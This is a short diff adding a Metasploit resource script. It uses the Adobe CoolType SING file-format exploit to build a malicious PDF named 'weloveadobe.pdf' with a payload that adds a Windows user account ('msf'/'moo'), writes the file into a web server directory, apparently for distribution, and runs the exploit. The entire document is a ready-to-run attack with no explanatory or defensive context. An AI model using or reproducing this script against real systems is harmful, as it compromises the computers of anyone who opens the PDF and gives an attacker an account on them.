@@ -1,0 +1,7 @@
+use exploit/windows/fileformat/adobe_cooltype_sing
+set PAYLOAD windows/adduser
+set USER msf
+set PASS moo
+set OUTPATH /var/www
+set FILENAME weloveadobe.pdf
+exploit -j
